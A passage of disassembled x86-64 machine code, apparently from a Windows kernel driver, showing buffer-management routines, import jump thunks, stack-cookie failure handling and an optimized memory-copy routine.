   140006ce0:	41 56                	push   %r14
   140006ce2:	48 83 ec 60          	sub    $0x60,%rsp
   140006ce6:	49 8b f1             	mov    %r9,%rsi
   140006ce9:	41 8b e8             	mov    %r8d,%ebp
   140006cec:	44 8b f2             	mov    %edx,%r14d
   140006cef:	48 8b f9             	mov    %rcx,%rdi
   140006cf2:	48 85 c9             	test   %rcx,%rcx
   140006cf5:	74 79                	je     0x140006d70
   140006cf7:	ff 15 7b 14 00 00    	call   *0x147b(%rip)        # 0x140008178
   140006cfd:	84 c0                	test   %al,%al
   140006cff:	74 6f                	je     0x140006d70
   140006d01:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140006d05:	e8 02 fa ff ff       	call   0x14000670c
   140006d0a:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   140006d0e:	45 8b ce             	mov    %r14d,%r9d
   140006d11:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   140006d18:	00 
   140006d19:	44 8b c5             	mov    %ebp,%r8d
   140006d1c:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140006d20:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140006d25:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140006d2b:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140006d31:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140006d37:	48 8b 00             	mov    (%rax),%rax
   140006d3a:	48 8b 0f             	mov    (%rdi),%rcx
   140006d3d:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140006d42:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140006d47:	33 d2                	xor    %edx,%edx
   140006d49:	ff 15 21 16 00 00    	call   *0x1621(%rip)        # 0x140008370
   140006d4f:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140006d56:	00 
   140006d57:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140006d5e:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140006d62:	e8 e9 f9 ff ff       	call   0x140006750
   140006d67:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   140006d6e:	eb 05                	jmp    0x140006d75
   140006d70:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140006d75:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140006d7a:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140006d7e:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140006d82:	49 8b e3             	mov    %r11,%rsp
   140006d85:	41 5e                	pop    %r14
   140006d87:	5f                   	pop    %rdi
   140006d88:	5e                   	pop    %rsi
   140006d89:	c3                   	ret
   140006d8a:	cc                   	int3
   140006d8b:	cc                   	int3
   140006d8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006d91:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006d96:	57                   	push   %rdi
   140006d97:	48 83 ec 20          	sub    $0x20,%rsp
   140006d9b:	48 8b f2             	mov    %rdx,%rsi
   140006d9e:	48 8b d9             	mov    %rcx,%rbx
   140006da1:	48 85 d2             	test   %rdx,%rdx
   140006da4:	74 60                	je     0x140006e06
   140006da6:	45 85 c0             	test   %r8d,%r8d
   140006da9:	74 5b                	je     0x140006e06
   140006dab:	4c 8b 09             	mov    (%rcx),%r9
   140006dae:	4d 85 c9             	test   %r9,%r9
   140006db1:	74 53                	je     0x140006e06
   140006db3:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140006db7:	48 85 d2             	test   %rdx,%rdx
   140006dba:	74 4a                	je     0x140006e06
   140006dbc:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140006dc0:	49 63 f8             	movslq %r8d,%rdi
   140006dc3:	48 8d 04 39          	lea    (%rcx,%rdi,1),%rax
   140006dc7:	48 3b c2             	cmp    %rdx,%rax
   140006dca:	76 24                	jbe    0x140006df0
   140006dcc:	48 8d 14 51          	lea    (%rcx,%rdx,2),%rdx
   140006dd0:	48 8b cb             	mov    %rbx,%rcx
   140006dd3:	e8 a0 00 00 00       	call   0x140006e78
   140006dd8:	84 c0                	test   %al,%al
   140006dda:	74 2a                	je     0x140006e06
   140006ddc:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140006de0:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140006de4:	48 8d 04 39          	lea    (%rcx,%rdi,1),%rax
   140006de8:	48 3b c2             	cmp    %rdx,%rax
   140006deb:	77 df                	ja     0x140006dcc
   140006ded:	4c 8b 0b             	mov    (%rbx),%r9
   140006df0:	49 03 c9             	add    %r9,%rcx
   140006df3:	4c 8b c7             	mov    %rdi,%r8
   140006df6:	48 8b d6             	mov    %rsi,%rdx
   140006df9:	e8 c2 03 00 00       	call   0x1400071c0
   140006dfe:	48 01 7b 08          	add    %rdi,0x8(%rbx)
   140006e02:	b0 01                	mov    $0x1,%al
   140006e04:	eb 02                	jmp    0x140006e08
   140006e06:	32 c0                	xor    %al,%al
   140006e08:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006e0d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006e12:	48 83 c4 20          	add    $0x20,%rsp
   140006e16:	5f                   	pop    %rdi
   140006e17:	c3                   	ret
   140006e18:	48 8b 01             	mov    (%rcx),%rax
   140006e1b:	c3                   	ret
   140006e1c:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   140006e21:	48 83 61 08 00       	andq   $0x0,0x8(%rcx)
   140006e26:	48 8b 39             	mov    (%rcx),%rdi
   140006e29:	48 85 ff             	test   %rdi,%rdi
   140006e2c:	74 11                	je     0x140006e3f
   140006e2e:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
   140006e33:	76 0a                	jbe    0x140006e3f
   140006e35:	33 c0                	xor    %eax,%eax
   140006e37:	33 c9                	xor    %ecx,%ecx
   140006e39:	f3 aa                	rep stos %al,(%rdi)
   140006e3b:	b0 01                	mov    $0x1,%al
   140006e3d:	eb 02                	jmp    0x140006e41
   140006e3f:	32 c0                	xor    %al,%al
   140006e41:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140006e46:	c3                   	ret
   140006e47:	cc                   	int3
   140006e48:	40 53                	rex push %rbx
   140006e4a:	48 83 ec 20          	sub    $0x20,%rsp
   140006e4e:	48 8b d9             	mov    %rcx,%rbx
   140006e51:	48 8b 09             	mov    (%rcx),%rcx
   140006e54:	48 85 c9             	test   %rcx,%rcx
   140006e57:	74 0b                	je     0x140006e64
   140006e59:	ba 51 61 78 58       	mov    $0x58786151,%edx
   140006e5e:	ff 15 dc 14 00 00    	call   *0x14dc(%rip)        # 0x140008340
   140006e64:	48 83 63 10 00       	andq   $0x0,0x10(%rbx)
   140006e69:	48 83 63 08 00       	andq   $0x0,0x8(%rbx)
   140006e6e:	48 83 23 00          	andq   $0x0,(%rbx)
   140006e72:	48 83 c4 20          	add    $0x20,%rsp
   140006e76:	5b                   	pop    %rbx
   140006e77:	c3                   	ret
   140006e78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006e7d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006e82:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006e87:	57                   	push   %rdi
   140006e88:	48 83 ec 20          	sub    $0x20,%rsp
   140006e8c:	48 8b 01             	mov    (%rcx),%rax
   140006e8f:	33 f6                	xor    %esi,%esi
   140006e91:	33 ed                	xor    %ebp,%ebp
   140006e93:	48 8b d9             	mov    %rcx,%rbx
   140006e96:	48 85 c0             	test   %rax,%rax
   140006e99:	74 07                	je     0x140006ea2
   140006e9b:	48 8b 69 08          	mov    0x8(%rcx),%rbp
   140006e9f:	48 8b f0             	mov    %rax,%rsi
   140006ea2:	48 83 61 08 00       	andq   $0x0,0x8(%rcx)
   140006ea7:	41 b8 51 61 78 58    	mov    $0x58786151,%r8d
   140006ead:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   140006eb1:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006eb6:	ff 15 4c 14 00 00    	call   *0x144c(%rip)        # 0x140008308
   140006ebc:	48 89 03             	mov    %rax,(%rbx)
   140006ebf:	48 85 c0             	test   %rax,%rax
   140006ec2:	74 24                	je     0x140006ee8
   140006ec4:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140006ec8:	48 8b f8             	mov    %rax,%rdi
   140006ecb:	33 c0                	xor    %eax,%eax
   140006ecd:	f3 aa                	rep stos %al,(%rdi)
   140006ecf:	48 85 f6             	test   %rsi,%rsi
   140006ed2:	74 27                	je     0x140006efb
   140006ed4:	48 8b 0b             	mov    (%rbx),%rcx
   140006ed7:	4c 8b c5             	mov    %rbp,%r8
   140006eda:	48 8b d6             	mov    %rsi,%rdx
   140006edd:	e8 de 02 00 00       	call   0x1400071c0
   140006ee2:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   140006ee6:	eb 05                	jmp    0x140006eed
   140006ee8:	48 85 f6             	test   %rsi,%rsi
   140006eeb:	74 0e                	je     0x140006efb
   140006eed:	ba 51 61 78 58       	mov    $0x58786151,%edx
   140006ef2:	48 8b ce             	mov    %rsi,%rcx
   140006ef5:	ff 15 45 14 00 00    	call   *0x1445(%rip)        # 0x140008340
   140006efb:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140006eff:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006f04:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006f09:	0f 95 c0             	setne  %al
   140006f0c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006f11:	48 83 c4 20          	add    $0x20,%rsp
   140006f15:	5f                   	pop    %rdi
   140006f16:	c3                   	ret
   140006f17:	cc                   	int3
   140006f18:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140006f1c:	c3                   	ret
   140006f1d:	ff 25 ad 11 00 00    	jmp    *0x11ad(%rip)        # 0x1400080d0
   140006f23:	ff 25 97 11 00 00    	jmp    *0x1197(%rip)        # 0x1400080c0
   140006f29:	ff 25 89 11 00 00    	jmp    *0x1189(%rip)        # 0x1400080b8
   140006f2f:	ff 25 7b 11 00 00    	jmp    *0x117b(%rip)        # 0x1400080b0
   140006f35:	ff 25 6d 11 00 00    	jmp    *0x116d(%rip)        # 0x1400080a8
   140006f3b:	ff 25 5f 11 00 00    	jmp    *0x115f(%rip)        # 0x1400080a0
   140006f41:	ff 25 51 11 00 00    	jmp    *0x1151(%rip)        # 0x140008098
   140006f47:	ff 25 43 11 00 00    	jmp    *0x1143(%rip)        # 0x140008090
   140006f4d:	ff 25 35 11 00 00    	jmp    *0x1135(%rip)        # 0x140008088
   140006f53:	ff 25 0f 11 00 00    	jmp    *0x110f(%rip)        # 0x140008068
   140006f59:	ff 25 f1 10 00 00    	jmp    *0x10f1(%rip)        # 0x140008050
   140006f5f:	ff 25 f3 10 00 00    	jmp    *0x10f3(%rip)        # 0x140008058
   140006f65:	ff 25 f5 10 00 00    	jmp    *0x10f5(%rip)        # 0x140008060
   140006f6b:	ff 25 57 11 00 00    	jmp    *0x1157(%rip)        # 0x1400080c8
   140006f71:	ff 25 f9 10 00 00    	jmp    *0x10f9(%rip)        # 0x140008070
   140006f77:	ff 25 fb 10 00 00    	jmp    *0x10fb(%rip)        # 0x140008078
   140006f7d:	ff 25 fd 10 00 00    	jmp    *0x10fd(%rip)        # 0x140008080
   140006f83:	cc                   	int3
   140006f84:	cc                   	int3
   140006f85:	cc                   	int3
   140006f86:	cc                   	int3
   140006f87:	cc                   	int3
   140006f88:	cc                   	int3
   140006f89:	cc                   	int3
   140006f8a:	cc                   	int3
   140006f8b:	cc                   	int3
   140006f8c:	cc                   	int3
   140006f8d:	cc                   	int3
   140006f8e:	cc                   	int3
   140006f8f:	cc                   	int3
   140006f90:	ff 25 ba 13 00 00    	jmp    *0x13ba(%rip)        # 0x140008350
   140006f96:	cc                   	int3
   140006f97:	cc                   	int3
   140006f98:	48 83 ec 28          	sub    $0x28,%rsp
   140006f9c:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140006fa0:	48 8b ca             	mov    %rdx,%rcx
   140006fa3:	49 8b d1             	mov    %r9,%rdx
   140006fa6:	e8 0d 00 00 00       	call   0x140006fb8
   140006fab:	b8 01 00 00 00       	mov    $0x1,%eax
   140006fb0:	48 83 c4 28          	add    $0x28,%rsp
   140006fb4:	c3                   	ret
   140006fb5:	cc                   	int3
   140006fb6:	cc                   	int3
   140006fb7:	cc                   	int3
   140006fb8:	48 83 ec 28          	sub    $0x28,%rsp
   140006fbc:	41 8b 00             	mov    (%r8),%eax
   140006fbf:	4c 8b c9             	mov    %rcx,%r9
   140006fc2:	44 8b d8             	mov    %eax,%r11d
   140006fc5:	4c 8b d1             	mov    %rcx,%r10
   140006fc8:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140006fcc:	a8 04                	test   $0x4,%al
   140006fce:	74 13                	je     0x140006fe3
   140006fd0:	41 8b 40 08          	mov    0x8(%r8),%eax
   140006fd4:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140006fd8:	f7 d8                	neg    %eax
   140006fda:	4c 03 d1             	add    %rcx,%r10
   140006fdd:	48 63 c8             	movslq %eax,%rcx
   140006fe0:	4c 23 d1             	and    %rcx,%r10
   140006fe3:	49 63 c3             	movslq %r11d,%rax
   140006fe6:	4e 8b 04 10          	mov    (%rax,%r10,1),%r8
   140006fea:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140006fee:	8b 48 08             	mov    0x8(%rax),%ecx
   140006ff1:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140006ff5:	0f b6 54 01 03       	movzbl 0x3(%rcx,%rax,1),%edx
   140006ffa:	f6 c2 0f             	test   $0xf,%dl
   140006ffd:	74 08                	je     0x140007007
   140006fff:	8b c2                	mov    %edx,%eax
   140007001:	83 e0 f0             	and    $0xfffffff0,%eax
   140007004:	4c 03 c8             	add    %rax,%r9
   140007007:	4d 33 c8             	xor    %r8,%r9
   14000700a:	49 8b c9             	mov    %r9,%rcx
   14000700d:	e8 9e 00 00 00       	call   0x1400070b0
   140007012:	48 83 c4 28          	add    $0x28,%rsp
   140007016:	c3                   	ret
   140007017:	cc                   	int3
   140007018:	cc                   	int3
   140007019:	cc                   	int3
   14000701a:	cc                   	int3
   14000701b:	cc                   	int3
   14000701c:	cc                   	int3
   14000701d:	cc                   	int3
   14000701e:	cc                   	int3
   14000701f:	cc                   	int3
   140007020:	c2 00 00             	ret    $0x0
   140007023:	cc                   	int3
   140007024:	ff 25 2e 11 00 00    	jmp    *0x112e(%rip)        # 0x140008158
   14000702a:	ff 25 50 11 00 00    	jmp    *0x1150(%rip)        # 0x140008180
   140007030:	ff 25 52 11 00 00    	jmp    *0x1152(%rip)        # 0x140008188
   140007036:	ff 25 54 11 00 00    	jmp    *0x1154(%rip)        # 0x140008190
   14000703c:	ff 25 56 11 00 00    	jmp    *0x1156(%rip)        # 0x140008198
   140007042:	ff 25 58 11 00 00    	jmp    *0x1158(%rip)        # 0x1400081a0
   140007048:	ff 25 5a 11 00 00    	jmp    *0x115a(%rip)        # 0x1400081a8
   14000704e:	ff 25 64 11 00 00    	jmp    *0x1164(%rip)        # 0x1400081b8
   140007054:	ff 25 66 11 00 00    	jmp    *0x1166(%rip)        # 0x1400081c0
   14000705a:	ff 25 68 11 00 00    	jmp    *0x1168(%rip)        # 0x1400081c8
   140007060:	ff 25 f2 12 00 00    	jmp    *0x12f2(%rip)        # 0x140008358
   140007066:	ff 25 7c 11 00 00    	jmp    *0x117c(%rip)        # 0x1400081e8
   14000706c:	ff 25 4e 12 00 00    	jmp    *0x124e(%rip)        # 0x1400082c0
   140007072:	ff 25 50 12 00 00    	jmp    *0x1250(%rip)        # 0x1400082c8
   140007078:	ff 25 7a 12 00 00    	jmp    *0x127a(%rip)        # 0x1400082f8
   14000707e:	cc                   	int3
   14000707f:	cc                   	int3
   140007080:	ff 25 92 0f 00 00    	jmp    *0xf92(%rip)        # 0x140008018
   140007086:	ff 25 74 0f 00 00    	jmp    *0xf74(%rip)        # 0x140008000
   14000708c:	ff 25 76 0f 00 00    	jmp    *0xf76(%rip)        # 0x140008008
   140007092:	ff 25 78 0f 00 00    	jmp    *0xf78(%rip)        # 0x140008010
   140007098:	cc                   	int3
   140007099:	cc                   	int3
   14000709a:	cc                   	int3
   14000709b:	cc                   	int3
   14000709c:	cc                   	int3
   14000709d:	cc                   	int3
   14000709e:	cc                   	int3
   14000709f:	cc                   	int3
   1400070a0:	cc                   	int3
   1400070a1:	cc                   	int3
   1400070a2:	cc                   	int3
   1400070a3:	cc                   	int3
   1400070a4:	cc                   	int3
   1400070a5:	cc                   	int3
   1400070a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400070ad:	00 00 00 
   1400070b0:	48 3b 0d f9 46 00 00 	cmp    0x46f9(%rip),%rcx        # 0x14000b7b0
   1400070b7:	75 10                	jne    0x1400070c9
   1400070b9:	48 c1 c1 10          	rol    $0x10,%rcx
   1400070bd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   1400070c2:	75 01                	jne    0x1400070c5
   1400070c4:	c3                   	ret
   1400070c5:	48 c1 c9 10          	ror    $0x10,%rcx
   1400070c9:	e9 02 00 00 00       	jmp    0x1400070d0
   1400070ce:	cc                   	int3
   1400070cf:	cc                   	int3
   1400070d0:	48 83 ec 38          	sub    $0x38,%rsp
   1400070d4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400070da:	48 8b d1             	mov    %rcx,%rdx
   1400070dd:	4c 8b 0d d4 46 00 00 	mov    0x46d4(%rip),%r9        # 0x14000b7b8
   1400070e4:	b9 f7 00 00 00       	mov    $0xf7,%ecx
   1400070e9:	4c 8b 05 c0 46 00 00 	mov    0x46c0(%rip),%r8        # 0x14000b7b0
   1400070f0:	48 ff 15 39 12 00 00 	rex.W call *0x1239(%rip)        # 0x140008330
   1400070f7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400070fc:	cc                   	int3
   1400070fd:	cc                   	int3
   1400070fe:	cc                   	int3
   1400070ff:	cc                   	int3
   140007100:	48 83 ec 28          	sub    $0x28,%rsp
   140007104:	b9 08 00 00 00       	mov    $0x8,%ecx
   140007109:	e8 02 00 00 00       	call   0x140007110
   14000710e:	cc                   	int3
   14000710f:	cc                   	int3
   140007110:	48 83 ec 38          	sub    $0x38,%rsp
   140007114:	4c 8b 0d 9d 46 00 00 	mov    0x469d(%rip),%r9        # 0x14000b7b8
   14000711b:	4c 8b 05 8e 46 00 00 	mov    0x468e(%rip),%r8        # 0x14000b7b0
   140007122:	8b d1                	mov    %ecx,%edx
   140007124:	b9 f7 00 00 00       	mov    $0xf7,%ecx
   140007129:	48 c7 44 24 20 01 00 	movq   $0x1,0x20(%rsp)
   140007130:	00 00 
   140007132:	48 ff 15 f7 11 00 00 	rex.W call *0x11f7(%rip)        # 0x140008330
   140007139:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000713e:	cc                   	int3
   14000713f:	cc                   	int3
   140007140:	ff 25 fa 0e 00 00    	jmp    *0xefa(%rip)        # 0x140008040
   140007146:	cc                   	int3
   140007147:	cc                   	int3
   140007148:	cc                   	int3
   140007149:	cc                   	int3
   14000714a:	cc                   	int3
   14000714b:	cc                   	int3
   14000714c:	cc                   	int3
   14000714d:	cc                   	int3
   14000714e:	cc                   	int3
   14000714f:	cc                   	int3
   140007150:	ff 25 d2 0e 00 00    	jmp    *0xed2(%rip)        # 0x140008028
   140007156:	cc                   	int3
   140007157:	cc                   	int3
   140007158:	cc                   	int3
   140007159:	cc                   	int3
   14000715a:	cc                   	int3
   14000715b:	cc                   	int3
   14000715c:	cc                   	int3
   14000715d:	cc                   	int3
   14000715e:	cc                   	int3
   14000715f:	cc                   	int3
   140007160:	ff 25 ca 0e 00 00    	jmp    *0xeca(%rip)        # 0x140008030
   140007166:	cc                   	int3
   140007167:	cc                   	int3
   140007168:	cc                   	int3
   140007169:	cc                   	int3
   14000716a:	cc                   	int3
   14000716b:	cc                   	int3
   14000716c:	cc                   	int3
   14000716d:	cc                   	int3
   14000716e:	cc                   	int3
   14000716f:	cc                   	int3
   140007170:	ff 25 c2 0e 00 00    	jmp    *0xec2(%rip)        # 0x140008038
   140007176:	cc                   	int3
   140007177:	cc                   	int3
   140007178:	cc                   	int3
   140007179:	cc                   	int3
   14000717a:	cc                   	int3
   14000717b:	cc                   	int3
   14000717c:	cc                   	int3
   14000717d:	cc                   	int3
   14000717e:	cc                   	int3
   14000717f:	cc                   	int3
   140007180:	cc                   	int3
   140007181:	cc                   	int3
   140007182:	cc                   	int3
   140007183:	cc                   	int3
   140007184:	cc                   	int3
   140007185:	cc                   	int3
   140007186:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000718d:	00 00 00 
   140007190:	ff e0                	jmp    *%rax
   140007192:	cc                   	int3
   140007193:	cc                   	int3
   140007194:	cc                   	int3
   140007195:	cc                   	int3
   140007196:	cc                   	int3
   140007197:	cc                   	int3
   140007198:	cc                   	int3
   140007199:	cc                   	int3
   14000719a:	cc                   	int3
   14000719b:	cc                   	int3
   14000719c:	cc                   	int3
   14000719d:	cc                   	int3
   14000719e:	cc                   	int3
   14000719f:	cc                   	int3
   1400071a0:	cc                   	int3
   1400071a1:	cc                   	int3
   1400071a2:	cc                   	int3
   1400071a3:	cc                   	int3
   1400071a4:	cc                   	int3
   1400071a5:	cc                   	int3
   1400071a6:	cc                   	int3
   1400071a7:	cc                   	int3
   1400071a8:	cc                   	int3
   1400071a9:	cc                   	int3
   1400071aa:	cc                   	int3
   1400071ab:	cc                   	int3
   1400071ac:	cc                   	int3
   1400071ad:	cc                   	int3
   1400071ae:	cc                   	int3
   1400071af:	cc                   	int3
   1400071b0:	cc                   	int3
   1400071b1:	cc                   	int3
   1400071b2:	cc                   	int3
   1400071b3:	cc                   	int3
   1400071b4:	cc                   	int3
   1400071b5:	cc                   	int3
   1400071b6:	cc                   	int3
   1400071b7:	cc                   	int3
   1400071b8:	cc                   	int3
   1400071b9:	cc                   	int3
   1400071ba:	cc                   	int3
   1400071bb:	cc                   	int3
   1400071bc:	cc                   	int3
   1400071bd:	cc                   	int3
   1400071be:	cc                   	int3
   1400071bf:	cc                   	int3
   1400071c0:	48 8b c1             	mov    %rcx,%rax
   1400071c3:	49 83 f8 08          	cmp    $0x8,%r8
   1400071c7:	72 37                	jb     0x140007200
   1400071c9:	49 83 f8 10          	cmp    $0x10,%r8
   1400071cd:	77 11                	ja     0x1400071e0
   1400071cf:	4c 8b 1a             	mov    (%rdx),%r11
   1400071d2:	4a 8b 54 02 f8       	mov    -0x8(%rdx,%r8,1),%rdx
   1400071d7:	4c 89 19             	mov    %r11,(%rcx)
   1400071da:	4a 89 54 01 f8       	mov    %rdx,-0x8(%rcx,%r8,1)
   1400071df:	c3                   	ret
   1400071e0:	49 83 f8 20          	cmp    $0x20,%r8
   1400071e4:	77 5a                	ja     0x140007240
   1400071e6:	0f 10 02             	movups (%rdx),%xmm0
   1400071e9:	42 0f 10 4c 02 f0    	movups -0x10(%rdx,%r8,1),%xmm1
   1400071ef:	0f 11 01             	movups %xmm0,(%rcx)
   1400071f2:	42 0f 11 4c 01 f0    	movups %xmm1,-0x10(%rcx,%r8,1)
   1400071f8:	c3                   	ret
   1400071f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140007200:	4d 85 c0             	test   %r8,%r8
   140007203:	74 15                	je     0x14000721a
   140007205:	48 2b d1             	sub    %rcx,%rdx
   140007208:	72 16                	jb     0x140007220
   14000720a:	44 8a 1c 11          	mov    (%rcx,%rdx,1),%r11b
   14000720e:	48 ff c1             	inc    %rcx
   140007211:	49 ff c8             	dec    %r8
   140007214:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   140007218:	75 f0                	jne    0x14000720a
   14000721a:	c3                   	ret
   14000721b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007220:	49 03 c8             	add    %r8,%rcx
   140007223:	44 8a 5c 11 ff       	mov    -0x1(%rcx,%rdx,1),%r11b
   140007228:	48 ff c9             	dec    %rcx
   14000722b:	49 ff c8             	dec    %r8
   14000722e:	44 88 19             	mov    %r11b,(%rcx)
   140007231:	75 f0                	jne    0x140007223
   140007233:	c3                   	ret
   140007234:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000723b:	00 00 00 00 00 
   140007240:	4e 8d 1c 02          	lea    (%rdx,%r8,1),%r11
   140007244:	48 2b d1             	sub    %rcx,%rdx
   140007247:	73 09                	jae    0x140007252
   140007249:	4c 3b d9             	cmp    %rcx,%r11
   14000724c:	0f 87 6e 01 00 00    	ja     0x1400073c0
   140007252:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140007256:	48 83 c1 10          	add    $0x10,%rcx
   14000725a:	f6 c1 0f             	test   $0xf,%cl
   14000725d:	74 12                	je     0x140007271
   14000725f:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140007263:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140007267:	0f 11 00             	movups %xmm0,(%rax)
   14000726a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000726d:	48 83 c1 10          	add    $0x10,%rcx
   140007271:	4c 03 c0             	add    %rax,%r8
   140007274:	4c 2b c1             	sub    %rcx,%r8
   140007277:	4d 8b c8             	mov    %r8,%r9
   14000727a:	49 c1 e9 06          	shr    $0x6,%r9
   14000727e:	74 6f                	je     0x1400072ef
   140007280:	49 81 f9 00 10 00 00 	cmp    $0x1000,%r9
   140007287:	0f 87 b3 00 00 00    	ja     0x140007340
   14000728d:	49 83 e0 3f          	and    $0x3f,%r8
   140007291:	eb 2d                	jmp    0x1400072c0
   140007293:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000729a:	0f 1f 84 00 00 00 00 
   1400072a1:	00 
   1400072a2:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400072a9:	0f 1f 84 00 00 00 00 
   1400072b0:	00 
   1400072b1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400072b8:	0f 1f 84 00 00 00 00 
   1400072bf:	00 
   1400072c0:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   1400072c4:	0f 10 54 11 10       	movups 0x10(%rcx,%rdx,1),%xmm2
   1400072c9:	0f 10 5c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm3
   1400072ce:	0f 10 64 11 30       	movups 0x30(%rcx,%rdx,1),%xmm4
   1400072d3:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   1400072d7:	48 83 c1 40          	add    $0x40,%rcx
   1400072db:	49 ff c9             	dec    %r9
   1400072de:	0f 29 49 c0          	movaps %xmm1,-0x40(%rcx)
   1400072e2:	0f 29 51 d0          	movaps %xmm2,-0x30(%rcx)
   1400072e6:	0f 29 59 e0          	movaps %xmm3,-0x20(%rcx)
   1400072ea:	0f 28 c4             	movaps %xmm4,%xmm0
   1400072ed:	75 d1                	jne    0x1400072c0
   1400072ef:	4d 8b c8             	mov    %r8,%r9
   1400072f2:	49 c1 e9 04          	shr    $0x4,%r9
   1400072f6:	74 19                	je     0x140007311
   1400072f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400072ff:	00 
   140007300:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   140007304:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140007308:	48 83 c1 10          	add    $0x10,%rcx
   14000730c:	49 ff c9             	dec    %r9
   14000730f:	75 ef                	jne    0x140007300
   140007311:	49 83 e0 0f          	and    $0xf,%r8
   140007315:	74 0e                	je     0x140007325
   140007317:	4e 8d 5c 01 f0       	lea    -0x10(%rcx,%r8,1),%r11
   14000731c:	41 0f 10 0c 13       	movups (%r11,%rdx,1),%xmm1
   140007321:	41 0f 11 0b          	movups %xmm1,(%r11)
   140007325:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   140007329:	c3                   	ret
   14000732a:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140007331:	0f 1f 84 00 00 00 00 
   140007338:	00 
   140007339:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140007340:	4d 8b c8             	mov    %r8,%r9
   140007343:	49 c1 e9 06          	shr    $0x6,%r9
   140007347:	49 83 e0 3f          	and    $0x3f,%r8
   14000734b:	0f 18 44 11 40       	prefetchnta 0x40(%rcx,%rdx,1)
   140007350:	eb 2e                	jmp    0x140007380
   140007352:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140007359:	0f 1f 84 00 00 00 00 
   140007360:	00 
   140007361:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140007368:	0f 1f 84 00 00 00 00 
   14000736f:	00 
   140007370:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140007377:	0f 1f 84 00 00 00 00 
   14000737e:	00 
   14000737f:	90                   	nop
   140007380:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140007384:	0f 10 54 11 10       	movups 0x10(%rcx,%rdx,1),%xmm2
   140007389:	0f 10 5c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm3
